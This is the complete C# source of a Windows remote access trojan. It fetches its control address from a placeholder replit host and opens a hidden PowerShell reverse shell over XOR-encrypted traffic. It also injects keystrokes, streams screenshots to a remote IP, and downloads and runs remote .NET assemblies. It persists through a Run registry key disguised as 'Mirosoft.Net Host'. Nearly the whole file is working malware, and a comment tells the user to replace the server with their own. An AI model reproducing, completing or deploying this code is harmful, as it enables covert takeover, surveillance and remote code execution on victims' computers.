// See https://aka.ms/new-console-template for more information
using System;
using System.IO;
using System.Net;
using System.Text;
using Microsoft.Win32;
using System.Reflection;
using System.Net.Sockets;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

public class Program
{
    protected static byte[] keys;
    protected static long cur = 0;
    protected static bool _ = true;
    protected static void copycmdln(NetworkStream ns, Process p)
    {
        _ = true;
        while(_)
        {
            try
            {
                char[] buf = new char[4096];
                int bytes = p.StandardOutput.Read(buf, 0, buf.Length); 
                byte[] b = Encoding.ASCII.GetBytes(buf, 0, bytes); 
                for(int i = 0; i < bytes; i++)
                {
                    if(cur % keys.Length == 0)
                    {
                        keys = SHA256.Create().ComputeHash(keys); 
                    }
                    b[i] ^= keys[cur % keys.Length];
                }
                ns.Write(b, 0, bytes); 
                Thread.Sleep(50);
            }
            catch
            {
                _ = false;
            }

        }
    }
    protected static void copycmdtoconhost(NetworkStream ns, Process p)
    {
        _ = true;
        while(_)
        {
            try
            {
                byte[] b = new byte[262144];
                int bytes = ns.Read(b, 0, b.Length); 
                for(int i = 0; i < bytes; i++)
                {
                    if(cur % keys.Length == 0)
                    {
                        keys = SHA256.Create().ComputeHash(keys); 
                    }
                    b[i] ^= keys[cur % keys.Length];
                }
                string cmd = Encoding.ASCII.GetString(b, 0, bytes); 
                if(cmd.StartsWith("SKS>/"))
                {
                    SendKeys.SendWait(cmd.Replace("SKS>/", "")); 
                }
                else if(cmd.StartsWith("msgb>/"))
                {
                    Task.Run(() => {MessageBox.Show(cmd.Replace("msgb>/", ""));}); 
                }
                else if(cmd.StartsWith("ExecAsync>/"))
                {
                    Task.Run(() => {
                        ProcessStartInfo psi = new ProcessStartInfo(); 
                        psi.FileName = cmd.Replace("ExecAsync>/", "").Split('#')[0]; 
                        psi.UseShellExecute = false; 
                        psi.CreateNoWindow = true; 
                        psi.RedirectStandardInput = true; 
                        psi.WindowStyle = ProcessWindowStyle.Hidden; 
                        var p = Process.Start(psi); 
                        p?.StandardInput.WriteLine(cmd.Replace("ExecAsync>/", "").Split('#')[1]); 
                        p?.StandardInput.Flush(); 
                    });
                }
                else if(cmd.StartsWith("remote-desktop>/"))
                {
                    string ip_port = cmd.Replace("remote-desktop>/", "");
                    string ip = ip_port.Split(':')[0];
                    int port = Convert.ToInt32(ip_port.Split(':')[1]);
                    Task.Run(() => {
                        while(true)
                        {
                            try
                            {
                                TcpClient client = new TcpClient();
                                client.Connect(ip, port); 
                                NetworkStream ns = client.GetStream(); 
                                Bitmap? bm = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                                Graphics gp = Graphics.FromImage(bm); 
                                gp.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy); 
                                bm = new Bitmap(bm, new Size(1280, 720));
                                MemoryStream ms = new MemoryStream();
                                bm.Save(ms, ImageFormat.Jpeg); 
                                byte[] shot = ms.ToArray();
                                ns.Write(shot, 0, shot.Length); 
                                ns.Close(); 
                                client.Close(); 
                            }
                            catch
                            {
                                System.Threading.Thread.Sleep(5000);
                            }
                        }
                    });
                }
                else if(cmd.StartsWith("Load>/"))
                {
					try
					{
						Task.Run(() => {
							Assembly asm = Assembly.Load(new WebClient().DownloadData(cmd.Replace("Load>/", "")));
							Type? t = asm.GetType("Program");
							MethodInfo? mi = t?.GetMethod("Main");
							mi?.Invoke(null, null);
						}).Start();
					}
					catch
					{
						
					}
                    
                }
                p.StandardInput.WriteLine(Encoding.ASCII.GetChars(b, 0, bytes), 0, bytes); 
                p.StandardInput.Flush(); 

                Thread.Sleep(100);
            }
            catch
            {
                _ = false;
            }

        }
    }
    public static void exec()
    {
        while(true)
        {
            try
            {
                _ = true;
                TcpClient client = new TcpClient();
                string ip_port = new WebClient().DownloadString("https://outofhere.example.repl.co/");  // replace by your http server that contain IPAddress:Port, you can use replit.com for hosting template HTML, CSS, JS
                
                client.Connect(ip_port.Split(':')[0], Convert.ToInt32(ip_port.Split(':')[1])); 
                NetworkStream ns = client.GetStream(); 
                RSA rsa = RSA.Create(2048);
                rsa.KeySize = 2048;
                //string pubKey = rsa.ToXmlString(false);
                //ns.Write(Encoding.ASCII.GetBytes(pubKey));
                ns.Write(rsa.ExportRSAPublicKey()); 
                byte[] data = new byte[rsa.KeySize / 4];
                int bytes = ns.Read(data, 0, data.Length); 
                
                keys = SHA256.Create().ComputeHash(rsa.Decrypt(data.Take(bytes).ToArray(), RSAEncryptionPadding.Pkcs1)); 
    
                ProcessStartInfo psi = new ProcessStartInfo(); 
                psi.FileName = "powershell.exe"; 
                psi.UseShellExecute = false; 
                psi.RedirectStandardError = true; 
                psi.RedirectStandardInput = true; 
                psi.RedirectStandardOutput = true; 
                psi.WindowStyle = ProcessWindowStyle.Hidden; 
                psi.CreateNoWindow = true; 
                psi.WorkingDirectory = Directory.GetCurrentDirectory(); 
                Process p = new Process(); 
                p.StartInfo = psi; 
                p.Start(); 
                Thread t = new Thread(() => copycmdln(ns, p));
                new Thread(() => copycmdtoconhost(ns, p)).Start();
                t.Start(); 
                while(_ & client.Connected)
                {
                    Thread.Sleep(1000);
                }
                
            }
            catch
            {
                Thread.Sleep(30000);
                keys = new byte[256];
                cur = 0;
                _ = false;
            }
        }

    }
    protected static void AddPersistance()
    {
        try
        {
            string current_pos = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            Directory.CreateDirectory(@"C:\Users\" + Environment.UserName + @"\.Net"); 
            Directory.CreateDirectory(@"C:\Users\" + Environment.UserName + @"\.Net\.dotnet-sdk"); 
            Directory.CreateDirectory(@"C:\Users\" + Environment.UserName + @"\.Net\.cache"); 
			Directory.CreateDirectory(@"C:\Users\" + Environment.UserName + @"\.Net\.dotnet-sdk\.lib"); 
            try
            {
                RegistryKey? key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true); 
                key?.SetValue("Mirosoft.Net Host", @"C:\Users\" + Environment.UserName + @"\.Net\.dotnet-sdk\.lib\dotnet.exe"); 
                key?.Close(); 
            }
            catch
            {

            }
            if(Directory.GetCurrentDirectory().StartsWith(@"C:\Users\" + Environment.UserName))
            {
                File.Move(current_pos, @"C:\Users\" + Environment.UserName + @"\.Net\.dotnet-sdk\.lib\dotnet.exe");
                //Process.Start(@"C:\Users\" + Environment.UserName + @"\.Net\.dotnet-sdk\.lib\dotnet.exe");
            }
            else
            {
                File.Copy(current_pos, @"C:\Users\" + Environment.UserName + @"\.Net\.dotnet-sdk\.lib\dotnet.exe");
                
            }
            

        }
        catch
        {

        }
        
        
    }
    public static void Main()
    {
        AddPersistance();
        exec();
    }
}